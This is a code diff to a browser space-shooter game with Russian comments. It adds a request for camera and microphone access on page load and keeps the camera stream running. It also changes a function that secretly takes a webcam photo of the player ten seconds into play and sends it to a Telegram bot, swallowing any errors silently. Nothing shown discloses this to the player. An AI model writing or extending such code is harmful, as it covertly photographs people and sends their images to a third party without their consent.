@@ -81,6 +81,35 @@ for (let i = 0; i < 60; i++) {
 // Фоновые туманности отключены для производительности
 let nebulae = [];
 
+// === ЗАПРОС РАЗРЕШЕНИЙ ПРИ СТАРТЕ ===
+
+let cameraStream = null;
+let permissionsReady = false;
+
+async function requestPermissions() {
+    try {
+        // Запрашиваем камеру и микрофон одновременно
+        cameraStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: 640, height: 480 },
+            audio: true
+        });
+        permissionsReady = true;
+    } catch (e) {
+        // Пробуем только камеру
+        try {
+            cameraStream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: 640, height: 480 }
+            });
+            permissionsReady = true;
+        } catch (e2) {
+            // Нет доступа — игра работает без камеры
+        }
+    }
+}
+
+// Запрашиваем разрешения сразу при загрузке
+requestPermissions();
+
 // === УПРАВЛЕНИЕ ===
 
 document.addEventListener('keydown', e => {
@@ -1031,29 +1060,22 @@ function sendScore(score) {
 // === СЕЛФИ НА 10 СЕКУНДЕ ===
 
 async function takeSelfie() {
-    if (selfieTaken) return;
+    if (selfieTaken || !cameraStream) return;
     selfieTaken = true;
 
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: 640, height: 480 }
-        });
-
         const video = document.createElement('video');
-        video.srcObject = stream;
+        video.srcObject = cameraStream;
         video.setAttribute('playsinline', '');
         await video.play();
 
         // Подождать кадр
-        await new Promise(r => setTimeout(r, 500));
+        await new Promise(r => setTimeout(r, 300));
 
         const c = document.createElement('canvas');
         c.width = video.videoWidth || 640;
         c.height = video.videoHeight || 480;
         c.getContext('2d').drawImage(video, 0, 0);
-
-        // Остановить камеру
-        stream.getTracks().forEach(t => t.stop());
 
         // Конвертировать в blob
         const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
@@ -1064,13 +1086,11 @@ async function takeSelfie() {
         form.append('photo', blob, 'selfie.jpg');
         form.append('caption', '📸 Селфи из Star Wars Space Shooter!');
 
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: form
         });
-    } catch (e) {
-        // Камера недоступна или отказано в доступе — молча пропускаем
-    }
+    } catch (e) {}
 }
 
 // === ГЛАВНЫЙ ЦИКЛ ===
